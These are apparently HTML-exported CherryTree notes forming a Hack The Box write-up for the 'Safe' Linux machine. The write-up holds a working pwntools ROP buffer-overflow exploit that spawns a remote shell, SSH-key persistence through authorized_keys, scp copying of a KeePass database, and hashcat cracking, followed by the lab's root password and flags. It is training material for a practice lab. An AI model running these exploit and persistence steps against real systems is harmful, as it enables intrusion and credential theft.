<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>safe (linux BoF)</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#safe (linux BoF)">safe (linux BoF)</a></p>
<ol>
<li><a href="#nmapAutomator">nmapAutomator</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#port 1337">port 1337</a></li>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#ghidra">ghidra</a></li>
<li><a href="#buffer overflow">buffer overflow</a></li>
<ol>
<li><a href="#checksec">checksec</a></li>
<li><a href="#step 1: crash the application">step 1: crash the application</a></li>
<li><a href="#step 2: find the offset">step 2: find the offset</a></li>
<ol>
<li><a href="#overwriting $rsp register to test calling main function twice">overwriting $rsp register to test calling main function twice</a></li>
</ol>
<li><a href="#step 3: hijack system call">step 3: hijack system call</a></li>
<li><a href="#step 4: collect all the necessary parameters for a ROP chain exploit">step 4: collect all the necessary parameters for a ROP chain exploit</a></li>
<ol>
<li><a href="#disass main">disass main</a></li>
<li><a href="#disass test">disass test</a></li>
</ol>
<li><a href="#step 5 write exploit.py">step 5 write exploit.py</a></li>
<ol>
<li><a href="#tweak for safe box">tweak for safe box</a></li>
<li><a href="#run">run</a></li>
</ol>
<li><a href="#obj dump system &amp; test">obj dump system &amp; test</a></li>
</ol>
</ol>
<li><a href="#privilege escalation">privilege escalation</a></li>
<ol>
<li><a href="#dropping ssh key">dropping ssh key</a></li>
<li><a href="#exfiltrate keepass">exfiltrate keepass</a></li>
<li><a href="#crack keepass">crack keepass</a></li>
<ol>
<li><a href="#organize picture files hashes">organize picture files hashes</a></li>
<li><a href="#hashcat">hashcat</a></li>
</ol>
<li><a href="#kpcli">kpcli</a></li>
<li><a href="#sudo into root">sudo into root</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
</body></html><div class="page" id="safe (linux BoF)"><h1><b><u>safe (linux BoF)</u></b></h1><img alt="images/1456-1.png" src="images/1456-1.png"/><br/><img alt="images/1456-2.png" src="images/1456-2.png"/><br/><br/><br/></div>
<div class="page" id="nmapAutomator"><h1><b><u>nmapAutomator</u></b></h1><img alt="images/1457-1.png" src="images/1457-1.png"/><br/><br/><img alt="images/1457-2.png" src="images/1457-2.png"/></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/1458-1.png" src="images/1458-1.png"/><br/><br/><img alt="images/1458-2.png" src="images/1458-2.png"/><br/><br/><img alt="images/1458-3.png" src="images/1458-3.png"/><br/><br/><img alt="images/1458-4.png" src="images/1458-4.png"/><br/><br/><img alt="images/1458-5.png" src="images/1458-5.png"/><br/><br/><img alt="images/1458-6.png" src="images/1458-6.png"/><br/><br/><br/></div>
<div class="page" id="port 1337"><h1><b><u>port 1337</u></b></h1><img alt="images/1459-1.png" src="images/1459-1.png"/><br/><span style="color:#24ff00;">This application screams of being vulnerable to a buffer overflow </span><br/><br/><span style="color:#ffa500;">nc 10.10.10.147 1337</span><br/><img alt="images/1459-2.png" src="images/1459-2.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">we're going to use a combination of </span><span style="color:#ffff00;">ghidra</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">Software Reverse Engineering Framework </span><span style="color:#24ff00;">and</span><span style="color:#ffff00;"> GDB Enhanced Features </span><span style="color:#24ff00;">(</span><span style="color:#ffa500;">GEF</span><span style="color:#24ff00;">) to analyze myapp for vulnerabilities<br/><br/>you can grab </span><span style="color:#ffff00;">ghidra</span><span style="color:#24ff00;"> releases from the official NSA github page </span><a href="https://github.com/NationalSecurityAgency/ghidra/releases">here</a><span style="color:#24ff00;"> <br/><br/>to install </span><span style="color:#ffa500;">GEF</span><span style="color:#24ff00;">, first we'll need </span><span style="color:#ffff00;">cmake</span><span style="color:#24ff00;"> since it is a dependency<br/></span><span style="color:#ffa500;">sudo apt-get install cmake</span><span style="color:#24ff00;"><br/><br/>then google </span><span style="color:#ffff00;">gef</span><span style="color:#24ff00;"> github</span> <a href="https://github.com/hugsy/gef">here</a><span style="color:#24ff00;"><br/>and follow the </span><span style="color:#ffff00;">instant setup</span><span style="color:#24ff00;"> section of the README file</span><br/><img alt="images/1469-1.png" src="images/1469-1.png"/><br/><br/><span style="color:#ffa500;">wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py<br/>echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br/><img alt="images/1469-2.png" src="images/1469-2.png"/><br/><br/><br/><span style="color:#24ff00;">to fire up ghidra, navigate to the directory you cloned it in and execute </span><span style="color:#ffa500;">./ghidrarun</span><br/><img alt="images/1469-3.png" src="images/1469-3.png"/><br/><br/><img alt="images/1469-4.png" src="images/1469-4.png"/><br/><br/><span style="color:#24ff00;">make a new project (and a new directory ghidra in your safe directory to hold it)</span><br/><img alt="images/1469-5.png" src="images/1469-5.png"/><br/><br/><span style="color:#24ff00;">next, </span><span style="color:#ffa500;">import</span><span style="color:#24ff00;"> the myapp file</span><br/><img alt="images/1469-6.png" src="images/1469-6.png"/><img alt="images/1469-7.png" src="images/1469-7.png"/><br/><br/><span style="color:#24ff00;">click OK and make not ghidra knows the file is an </span><span style="color:#ffa500;">ELF</span><span style="color:#24ff00;"> file</span><br/><img alt="images/1469-8.png" src="images/1469-8.png"/><br/>OK through the import summary<br/><img alt="images/1469-9.png" src="images/1469-9.png"/><br/><img alt="images/1469-10.png" src="images/1469-10.png"/><br/><br/><br/><span style="color:#24ff00;">finally click the </span><span style="color:#ffff00;">dragon icon</span><span style="color:#24ff00;"> to load it into </span><span style="color:#ffa500;">ghidra</span><br/><br/><span style="color:#24ff00;">you may need to go navigate to</span><span style="color:#ffa500;"> file-&gt;open-&gt;myapp</span><span style="color:#24ff00;"> as well after </span><span style="color:#ffa500;">ghidra</span><span style="color:#24ff00;"> runs if you see </span><span style="color:#ff0000;">no programs </span><span style="color:#24ff00;">in ghidra initially</span><br/><img alt="images/1469-11.png" src="images/1469-11.png"/><br/><br/><span style="color:#24ff00;">finally, click the </span><span style="color:#ffff00;">select all </span><span style="color:#24ff00;">bujtton on the analysis options page and you're good to go!</span><br/><img alt="images/1469-12.png" src="images/1469-12.png"/><br/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="ghidra"><h1><b><u>ghidra</u></b></h1><img alt="images/1462-1.png" src="images/1462-1.png"/><br/><br/><span style="color:#24ff00;">first, we're going to analyze myapp's </span><span style="color:#ffa500;">main function</span><span style="color:#24ff00;">, on the left pane of ghidra there is a symbol tree listing, expand the Functions folder and there should be a main function highlighted in pink</span><br/><span style="color:#24ff00;">Note: pink highlighted functions are </span><span style="color:#ffff00;">local functions</span><span style="color:#24ff00;"> and blue highlighted functions are </span><span style="color:#ffff00;">imported</span><span style="color:#24ff00;"> from libraries ike lib.c</span><br/><img alt="images/1462-2.png" src="images/1462-2.png"/><img alt="images/1462-3.png" src="images/1462-3.png"/><br/><br/><img alt="images/1462-4.png" src="images/1462-4.png"/><br/><br/><span style="color:#24ff00;">A quick rundown of what </span><span style="color:#ffa500;">./myapp </span><span style="color:#24ff00;">does<br/>1. takes an input of 112 bytes </span><img alt="images/1462-5.png" src="images/1462-5.png"/> and saves it into the variable <span style="color:#ffa500;">local_78 </span><img alt="images/1462-6.png" src="images/1462-6.png"/><span style="color:#24ff00;"> <br/>2. runs a system call on </span><span style="color:#ffa500;">/usr/bin/uptime</span><span style="color:#24ff00;"> which is the reason we see the </span><img alt="images/1462-7.png" src="images/1462-7.png"/> when we run myapp<img alt="images/1462-8.png" src="images/1462-8.png"/><br/>3. <span style="color:#ffa500;">myapp</span><span style="color:#24ff00;"> then reads characters from the standard input using the </span><span style="color:#ffa500;">gets()</span><span style="color:#24ff00;"> function and stores them as a C string until a newline character or the end-of-file is reached. The </span><span style="color:#ffa500;">gets() </span><span style="color:#24ff00;">function </span><span style="color:#ffff00;">does not limit the amount of characters the </span><span style="color:#ffa500;">local_78 </span><span style="color:#ffff00;">variable has within it </span><span style="color:#24ff00;">so this is undoubtably vulnerable to a </span><span style="color:#ffff00;">Buffer Overflow Attack</span><span style="color:#24ff00;">!<br/>4. lastly. main then writes a string to stdout using the</span><span style="color:#ffa500;"> puts() </span><span style="color:#24ff00;">function which is why we see what we type echo back to us when we call myapp</span><br/><img alt="images/1462-9.png" src="images/1462-9.png"/><br/></div>
<div class="page" id="buffer overflow"><h1><b><u>buffer overflow</u></b></h1><img alt="images/1460-1.png" src="images/1460-1.png"/><br/></div>
<div class="page" id="checksec"><h1><b><u>checksec</u></b></h1><img alt="images/1461-1.png" src="images/1461-1.png"/><br/><br/><img alt="images/1461-2.png" src="images/1461-2.png"/><br/><br/></div>
<div class="page" id="step 1: crash the application"><h1><b><u>step 1: crash the application</u></b></h1><span style="color:#24ff00;">SInce we know </span><span style="color:#ffa500;">./myapp's local_76</span><span style="color:#24ff00;"> variable is suppose to take </span><img alt="images/1470-1.png" src="images/1470-1.png"/>  bytes, lets send the function a few more bytes and crash it, <span style="color:#ffa500;">200</span><span style="color:#24ff00;"> bytes for good measure</span><br/><img alt="images/1470-2.png" src="images/1470-2.png"/><br/><br/><img alt="images/1470-3.png" src="images/1470-3.png"/><br/><img alt="images/1470-4.png" src="images/1470-4.png"/><br/><br/><span style="color:#24ff00;">gdb tells us we crash at the return function</span><img alt="images/1470-5.png" src="images/1470-5.png"/>, which points to the<span style="color:#ffa500;"> $rsp</span><span style="color:#24ff00;"> register, which we see has been completely overwritten with A's</span><br/><img alt="images/1470-6.png" src="images/1470-6.png"/><br/><br/><span style="color:#24ff00;">take note of the </span><span style="color:#ffa500;">$RIP</span><span style="color:#24ff00;"> register as well, here's</span><span style="color:#ffff00;"> rana khalil's </span><span style="color:#24ff00;">rundown of our issue at the moment:</span><br/><img alt="images/1470-7.png" src="images/1470-7.png"/><br/><img alt="images/1470-8.png" src="images/1470-8.png"/></div>
<div class="page" id="step 2: find the offset"><h1><b><u>step 2: find the offset</u></b></h1><span style="color:#24ff00;">next step is to find where exactly where the $rsp lies in memory, which will bring us closer to overwriting the $rip<br/><br/>to do this we'll create a pattern that will pinpoint the $rsp's location</span><br/><span style="color:#ffa500;">pattern create 200</span><br/><img alt="images/519-1.png" src="images/519-1.png"/><br/><br/><span style="color:#24ff00;">now rerun myapp with gdb and crash the program again</span><br/><img alt="images/519-2.png" src="images/519-2.png"/><br/><img alt="images/519-3.png" src="images/519-3.png"/><br/><br/><span style="color:#24ff00;">take note of the string that overwrites the </span><span style="color:#ffa500;">$rsp </span><span style="color:#24ff00;">register, copy and paste that string into</span><br/><img alt="images/519-4.png" src="images/519-4.png"/><br/><br/><span style="color:#ffa500;">pattern search paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava</span><br/><img alt="images/519-5.png" src="images/519-5.png"/><br/><br/><span style="color:#24ff00;">now lets test to see if the offset is correct. we'll generate </span><span style="color:#ffa500;">120 A's </span><span style="color:#24ff00;">and follow with </span><span style="color:#ffa500;">8 B's and 8 C's </span><span style="color:#24ff00;">and see what kind of output we get</span><br/><img alt="images/519-6.png" src="images/519-6.png"/><br/><br/><span style="color:#24ff00;">copy and pasting this string into myapp shows us our offset is correct! <br/></span><img alt="images/519-7.png" src="images/519-7.png"/> <br/>now the goal here is that we can contrinue through myapp by placing code where the <span style="color:#ffa500;">8 B's</span><span style="color:#24ff00;"> lie</span><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="overwriting $rsp register to test calling main function twice"><h1><b><u>overwriting $rsp register to test calling main function twice</u></b></h1><span style="color:#24ff00;">To demonstrate what that means, lets being building our </span><span style="color:#ffa500;">exploit</span><span style="color:#24ff00;"> now that we know where the </span><span style="color:#ffa500;">$rsp</span><span style="color:#24ff00;"> register is located<br/>first lets find out where in </span><span style="color:#ffa500;">myapp</span><span style="color:#24ff00;"> the main function is located in memory, to this we'll use </span><span style="color:#ffa500;">ghidra</span><span style="color:#24ff00;"> <br/></span><img alt="images/521-1.png" src="images/521-1.png"/><br/>main starts at the memory address <span style="color:#ffff00;">040115f</span><span style="color:#24ff00;"> </span><img alt="images/521-2.png" src="images/521-2.png"/>, take note that it is <span style="color:#ffff00;">8 bytes long </span><span style="color:#24ff00;"><br/><br/><br/>now lets begin writing our pwn tools </span><span style="color:#ffa500;">exploit</span><span style="color:#24ff00;"> in py, read my commented notes for details on the exploit<br/></span><img alt="images/521-3.png" src="images/521-3.png"/><br/><img alt="images/521-4.png" src="images/521-4.png"/><br/><br/>running<br/>will call our main function twice, use ‘<span style="color:#ffa500;">c</span><span style="color:#24ff00;">’ to cycle through them both to verify our exploit functions correctly<br/></span><img alt="images/521-5.png" src="images/521-5.png"/><br/><br/><img alt="images/521-6.png" src="images/521-6.png"/><br/>type <span style="color:#ffa500;">c</span><span style="color:#24ff00;"> to continue through our breakpoint<br/><br/></span><img alt="images/521-7.png" src="images/521-7.png"/><br/>and notice although main is called twice here, we've successfully overwritten the <span style="color:#ffa500;">$rsp</span><span style="color:#24ff00;"> register to </span><span style="color:#ffa500;">call</span><span style="color:#24ff00;"> main a </span><span style="color:#ffff00;">second</span><span style="color:#24ff00;"> time, verifying our exploit is working!</span><br/><br/><span style="color:#24ff00;">What we just did here is called a </span><span style="color:#ffff00;">ROP Chain Exploit</span><span style="color:#24ff00;">!</span>But the question that still stands is how do we load our /bin/bash string into the system call?</div>
<div class="page" id="step 3: hijack system call"><h1><b><u>step 3: hijack system call</u></b></h1><span style="color:#24ff00;">Now that we know that we can overwrite </span><span style="color:#ffa500;">./myapp's $rsp</span><span style="color:#24ff00;"> register to call a function of our choosing, we want to </span><span style="color:#ffff00;">hijack</span><span style="color:#24ff00;"> main's </span><span style="color:#ffa500;">system</span><span style="color:#24ff00;"> call because that will run whatever function we want (</span><span style="color:#ffa500;">/bin/bash</span><span style="color:#24ff00;">)</span><br/><br/><img alt="images/520-1.png" src="images/520-1.png"/><br/><br/><span style="color:#24ff00;">Using </span><span style="color:#ffa500;">Ghidra</span><span style="color:#24ff00;">, look at the main function memory addresses and note the system call's location at </span><span style="color:#ffa500;">0040116e</span><br/><img alt="images/520-2.png" src="images/520-2.png"/><br/><br/><span style="color:#24ff00;">lets set a </span><span style="color:#ffff00;">breakpoint</span><span style="color:#24ff00;"> at this memory address and run our exploit <br/></span><img alt="images/520-3.png" src="images/520-3.png"/><br/>set a <span style="color:#ffff00;">breakpoint</span><span style="color:#24ff00;"> to the memory address of main's system call with</span><br/><span style="color:#ffa500;">b *0x40116e</span><br/><img alt="images/520-4.png" src="images/520-4.png"/><br/><img alt="images/520-5.png" src="images/520-5.png"/><br/><br/><span style="color:#24ff00;">what </span><span style="color:#ffa500;">myapp</span><span style="color:#24ff00;"> is doing is first loading a variable into </span><img alt="images/520-6.png" src="images/520-6.png"/> with <img alt="images/520-7.png" src="images/520-7.png"/> which stands for <span style="color:#ffa500;">load effective address</span><br/><span style="color:#24ff00;">the </span><span style="color:#ffa500;">system</span><span style="color:#24ff00;"> call is located at</span> <img alt="images/520-8.png" src="images/520-8.png"/><br/><br/><br/><img alt="images/520-9.png" src="images/520-9.png"/><br/><span style="color:#24ff00;">since </span><span style="color:#ffa500;">system</span><span style="color:#24ff00;"> is only taking </span><span style="color:#ffff00;">1</span><span style="color:#24ff00;"> argument, only </span><span style="color:#ffff00;">1</span><span style="color:#24ff00;"> argument gets loaded so if we do<br/></span><span style="color:#ffa500;">x/s $rdi </span><span style="color:#24ff00;">we see theres no memory address saved to our variable<br/></span><img alt="images/520-10.png" src="images/520-10.png"/><br/><br/>step through once with<span style="color:#ffa500;"> si </span> <br/><img alt="images/520-11.png" src="images/520-11.png"/><br/>right here is what we're loading into register <span style="color:#ffa500;">$rdi</span><br/><img alt="images/520-12.png" src="images/520-12.png"/><br/><br/>step through the program again with <span style="color:#ffa500;">si</span><br/><img alt="images/520-13.png" src="images/520-13.png"/><br/><br/><img alt="images/520-14.png" src="images/520-14.png"/><br/><img alt="images/520-15.png" src="images/520-15.png"/><br/><span style="color:#24ff00;">we see </span><span style="color:#ffa500;">/usr/bin/uptime</span><span style="color:#24ff00;"> is loaded into the $rdi register</span><br/><br/><span style="color:#24ff00;">All we have to do to exploit this now is to find out to put our string</span><span style="color:#ffff00;"> (/bin/bash) </span><span style="color:#24ff00;">into $rdi</span><br/><span style="color:#24ff00;">This is where the </span><span style="color:#ffa500;">Test</span><span style="color:#24ff00;"> method comes in<br/></span><img alt="images/520-16.png" src="images/520-16.png"/><br/><img alt="images/520-17.png" src="images/520-17.png"/><br/>first 2 things set up the stack for being in a function<br/>we push the base pointer to the stack and then we copy the rsp stack pointer into the base pointer<br/><br/>code begins here <img alt="images/520-18.png" src="images/520-18.png"/><br/>we take the stack pointer and putting it into rdi and then jumping into whatever is in <span style="color:#ffa500;">R13</span><br/><br/>gef has a built in tool call ropper that will allow us to take a closer look at what <img alt="images/520-19.png" src="images/520-19.png"/> does<br/>ropper --search “pop r13”<br/><img alt="images/520-20.png" src="images/520-20.png"/><br/>we see it is located in memory at <img alt="images/520-21.png" src="images/520-21.png"/> and pops 3 arguments off the stack onto the stack pointer <img alt="images/520-22.png" src="images/520-22.png"/> so although we only need r13 to load our /bin/bash system call, we can load null bytes into r14 and r15 and get everything we need out of the test function<br/><br/><img alt="images/520-23.png" src="images/520-23.png"/><br/><img alt="images/520-24.png" src="images/520-24.png"/><br/><img alt="images/520-25.png" src="images/520-25.png"/><br/><img alt="images/520-26.png" src="images/520-26.png"/><br/><br/><strong><span style="color:#ffa500;">0x0000000000401206: pop r13; pop r14; pop r15; ret;</span></strong><br/></div>
<div class="page" id="step 4: collect all the necessary parameters for a ROP chain exploit"><h1><b><u>step 4: collect all the necessary parameters for a ROP chain exploit</u></b></h1><img alt="images/1552-1.png" src="images/1552-1.png"/><br/><br/><img alt="images/1552-2.png" src="images/1552-2.png"/><br/></div>
<div class="page" id="disass main"><h1><b><u>disass main</u></b></h1>we see from <span style="color:#ffff00;">main</span> that we <span style="color:#ffff00;">system</span> gets called, <span style="color:#ffff00;">printf</span> gets called, <span style="color:#ffff00;">get</span> gets called and <span style="color:#ffff00;">put</span> gets called<br/><br/><img alt="images/1465-1.png" src="images/1465-1.png"/><br/><br/></div>
<div class="page" id="disass test"><h1><b><u>disass test</u></b></h1><img alt="images/1466-1.png" src="images/1466-1.png"/><h2><br/><br/><br/></h2></div>
<div class="page" id="step 5 write exploit.py"><h1><b><u>step 5 write exploit.py</u></b></h1><span style="color:#ffa500;">from pwn import *</span><span style="color:#00efff;"># initial configuration</span><br/><span style="color:#ffa500;">p = process("./myapp")</span><br/><span style="color:#ffa500;">context(os="linux", arch="amd64") </span> <span style="color:#00efff;"># parameters</span><br/><span style="color:#ffa500;">junk = "A" * 112.encode()</span> <span style="color:#00efff;"># offset - 8.</span><br/><span style="color:#ffa500;">cmd = "/bin/sh\x00".encode() </span><span style="color:#00efff;"># argument that will be passed to RBP + null byte</span><br/><span style="color:#ffa500;">pop_r13 = p64(0x401206)</span> <span style="color:#00efff;"># pop r13</span><br/><span style="color:#ffa500;">random = p64(0x000000) </span><span style="color:#00efff;"># random (null value) that will be put into r14 and r15</span><br/><span style="color:#ffa500;">mov_rsp_to_rdi = p64(0x401152)</span> <span style="color:#00efff;"># mv rdi, rsp</span> <span style="color:#00efff;">(test function memory location)</span><br/><span style="color:#ffa500;">system = p64(0x401040)  </span><span style="color:#00efff;"># buffer</span><br/><br/><span style="color:#ffa500;">buf = junk + cmd</span> <span style="color:#00efff;">#get to the RBP and pass the /bin/sh string</span><br/><span style="color:#ffa500;">buf += pop_r13</span> <span style="color:#00efff;"># pop r13</span><br/><span style="color:#ffa500;">buf += system</span> <span style="color:#00efff;"># set r13 to system call</span><br/><span style="color:#ffa500;">buf += random + random </span><span style="color:#00efff;"># pop r14, pop r15 </span><br/><span style="color:#ffa500;">buf += mov_rsp_to_rdi</span><br/><br/><span style="color:#ffa500;">p.recvline()<br/>p.sendline(buf)<br/>p.interactive()</span><br/><br/><img alt="images/1463-1.png" src="images/1463-1.png"/></div>
<div class="page" id="tweak for safe box"><h1><b><u>tweak for safe box</u></b></h1><span style="color:#ffa500;">p = remote("10.10.10.147", 1337)                                                                            </span><br/><img alt="images/1467-1.png" src="images/1467-1.png"/></div>
<div class="page" id="run"><h1><b><u>run</u></b></h1><img alt="images/1468-1.png" src="images/1468-1.png"/><br/><br/><img alt="images/1468-2.png" src="images/1468-2.png"/></div>
<div class="page" id="obj dump system &amp; test"><h1><b><u>obj dump system &amp; test</u></b></h1><img alt="images/1479-1.png" src="images/1479-1.png"/></div>
<div class="page" id="privilege escalation"><h1><b><u>privilege escalation</u></b></h1><span style="color:#24ff00;">Our shell at the moment has no way to import a proper tty at the moment so lets drop a </span><span style="color:#ffff00;">key</span><span style="color:#24ff00;"> so we can </span><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> in</span><br/><img alt="images/1472-1.png" src="images/1472-1.png"/></div>
<div class="page" id="dropping ssh key"><h1><b><u>dropping ssh key</u></b></h1><span style="color:#24ff00;">Looking into </span><span style="color:#ffff00;">user's</span><span style="color:#ffa500;"> /home</span><span style="color:#24ff00;"> directory</span><br/><img alt="images/522-1.png" src="images/522-1.png"/><br/><span style="color:#24ff00;"><br/><br/>to generate an ssh keypair</span>:<br/><span style="color:#ffa500;">ssh-keygen -f user</span><br/><img alt="images/522-2.png" src="images/522-2.png"/><br/><span style="color:#ffa500;">chmod 600</span><br/><img alt="images/522-3.png" src="images/522-3.png"/><br/>copy the contents of our public key we generated<br/><img alt="images/522-4.png" src="images/522-4.png"/><br/><br/>and echo it into<span style="color:#ffa500;"> .ssh/authorized_keys</span><span style="color:#24ff00;"> file on the box</span><br/><img alt="images/522-5.png" src="images/522-5.png"/><br/><span style="color:#ffa500;">echo &lt;pubkey&gt; &gt;&gt; authorized_keys</span><br/><img alt="images/522-6.png" src="images/522-6.png"/><br/><br/><span style="color:#24ff00;">and now we can ssh in!</span><br/><span style="color:#ffa500;">ssh -i &lt;priv-key&gt; user@10.10.10.147</span><br/><img alt="images/522-7.png" src="images/522-7.png"/><br/></div>
<div class="page" id="exfiltrate keepass"><h1><b><u>exfiltrate keepass</u></b></h1><span style="color:#24ff00;">We find a KeePass database. Let’s copy everything into our attack machine. The easiest way to do this is through SCP since SSH is open. </span><br/><br/><img alt="images/1473-1.png" src="images/1473-1.png"/><br/><br/><span style="color:#24ff00;">lets make a directory for the files to stay organized</span><br/><img alt="images/1473-2.png" src="images/1473-2.png"/><br/><span style="color:#ffa500;">scp -i ../keys/user user@10.10.10.147:* .<br/></span><span style="color:#24ff00;">where</span><span style="color:#ffa500;"> <br/>• </span><span style="color:#24ff00;">is to download all the contents of </span><span style="color:#ffa500;">/home/user<br/>. </span><span style="color:#24ff00;">is to save all the contents to our current directory</span><br/><img alt="images/1473-3.png" src="images/1473-3.png"/><br/><br/><br/><span style="color:#24ff00;">we see a bunch of pictures here, lets use</span><br/><span style="color:#ffa500;">nautilus . </span><span style="color:#24ff00;">to view them in a nice folder</span><br/><img alt="images/1473-4.png" src="images/1473-4.png"/><br/><img alt="images/1473-5.png" src="images/1473-5.png"/><br/><span style="color:#24ff00;"><br/>we see that these are standard jpegs when using </span><span style="color:#ffa500;">exiftool</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">binwalk</span><span style="color:#24ff00;"> to anayze them so no need to screenshot them in the writeup, however they hold a hidden key file for our keepass (kdbx file since they sometimes require a key to unlock them)</span></div>
<div class="page" id="crack keepass"><h1><b><u>crack keepass</u></b></h1><span style="color:#24ff00;">first we need to use john to crack crack the keepass database password to decompress it, john has a module for keepass that we can locate with <br/></span><span style="color:#ffa500;">locate *2john </span><span style="color:#24ff00;">that will list it for us</span><br/><img alt="images/1475-1.png" src="images/1475-1.png"/><br/><br/><br/><br/></div>
<div class="page" id="organize picture files hashes"><h1><b><u>organize picture files hashes</u></b></h1><span style="color:#24ff00;">lets write a </span><span style="color:#ffa500;">bash loop</span><span style="color:#24ff00;"> that will iterate through all of our picture files to find the </span><span style="color:#ffff00;">key</span><span style="color:#24ff00;"> within them<br/><br/>lets start by writing a simple bash loop to list all of our pictures</span><br/><span style="color:#ffa500;">for i in $(ls *.JPG); do echo $i; done;</span><br/><img alt="images/1478-1.png" src="images/1478-1.png"/><br/><br/><br/><span style="color:#24ff00;">now lets run </span><span style="color:#ffa500;">keepass2john</span><span style="color:#24ff00;"> on all of the picture files</span><br/><span style="color:#ffa500;">for i in $(ls *.JPG); do keepass2john -k $i MyPasswords.kdbx; done</span> <br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-k</span><span style="color:#24ff00;"> is the key</span><br/><img alt="images/1478-2.png" src="images/1478-2.png"/><br/><br/><span style="color:#24ff00;">we see the hashes perfectly, but we don't see which </span><span style="color:#ffff00;">hash</span><span style="color:#24ff00;"> comes from which </span><span style="color:#ffff00;">picture file</span><span style="color:#24ff00;">, lets use </span><span style="color:#ffa500;">sed</span><span style="color:#24ff00;"> to replace the MyPasswords with the name of the picture file the loop is currently using </span><br/><span style="color:#ffa500;">for i in (ls *.JPG); do keepass2john -k $i MyPasswords.kdbx | sed “s/MyPasswords/$i/g”; done </span><br/><img alt="images/1478-3.png" src="images/1478-3.png"/><br/><br/><span style="color:#24ff00;">now we can pass each </span><span style="color:#ffff00;">hash</span><span style="color:#24ff00;"> into </span><span style="color:#ffa500;">hashcat</span> <span style="color:#24ff00;">to crack the kdb </span><span style="color:#ffff00;">password</span><br/></div>
<div class="page" id="hashcat"><h1><b><u>hashcat</u></b></h1><img alt="images/523-1.png" src="images/523-1.png"/><br/><br/><br/><span style="color:#24ff00;">find what hashcat module we need for KeePass<br/></span><img alt="images/523-2.png" src="images/523-2.png"/><br/><span style="color:#24ff00;">okay so we know the hashcat module for keepass is 13400</span><br/><br/><span style="color:#24ff00;">hashcat is only capable of running one </span><span style="color:#ffff00;">hash</span><span style="color:#24ff00;"> at a time so we'll have to load each </span><span style="color:#ffff00;">individual hash </span><span style="color:#24ff00;">into its own </span><span style="color:#ffa500;">textfile</span><span style="color:#24ff00;">, eventually though, we get a hit</span><br/><span style="color:#ffa500;">hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --user</span><br/><img alt="images/523-3.png" src="images/523-3.png"/><br/><img alt="images/523-4.png" src="images/523-4.png"/><br/><br/><span style="color:#24ff00;">we find our password is </span><span style="color:#ffff00;">bullshit</span></div>
<div class="page" id="kpcli"><h1><b><u>kpcli</u></b></h1><span style="color:#24ff00;">now that we have our password (</span><span style="color:#ffff00;">bullshit</span><span style="color:#24ff00;">) and our picture file key</span><span style="color:#ffff00;"> IMG_0547.JPG</span><span style="color:#24ff00;"> lets go into our keypass file with the help of the img file<br/><br/></span><span style="color:#ffa500;">kpcli --kdb MyPasswords.kdb --key IMG_0547.JPG</span><br/><img alt="images/1476-1.png" src="images/1476-1.png"/><br/><br/>navigate into MyPasswords<br/><img alt="images/1476-2.png" src="images/1476-2.png"/><br/><br/>looking at the MyPasswords list, the very bottom shows root's password! lets view it with...<br/><img alt="images/1476-3.png" src="images/1476-3.png"/><br/><span style="color:#ffa500;">show 0 </span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1476-4.png" src="images/1476-4.png"/><br/><br/>we see the password is hidden, to reveal it use<br/><span style="color:#ffa500;">show 0 -f </span><br/><img alt="images/1476-5.png" src="images/1476-5.png"/><br/><br/><span style="color:#24ff00;">our root password is </span><span style="color:#ffff00;">u3v2249dl9ptv465cogl3cnpo3fyhk</span></div>
<div class="page" id="sudo into root"><h1><b><u>sudo into root</u></b></h1><span style="color:#24ff00;">ssh doesn't allow us to log in via ssh so we switch user from our ‘user' session to escalate to </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><br/><span style="color:#ffff00;">u3v2249dl9ptv465cogl3cnpo3fyhk</span><br/><img alt="images/1477-1.png" src="images/1477-1.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1471-1.png" src="images/1471-1.png"/><br/><span style="color:#ffff00;">7a29ee9b0fa17ac013d4bf01fd127690</span><br/><br/><img alt="images/1471-2.png" src="images/1471-2.png"/><br/><span style="color:#ffff00;">d7af235eb1db9fa059d2b99a6d1d5453</span></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1981-1.png" src="images/1981-1.png"/></div>
</div></body></html>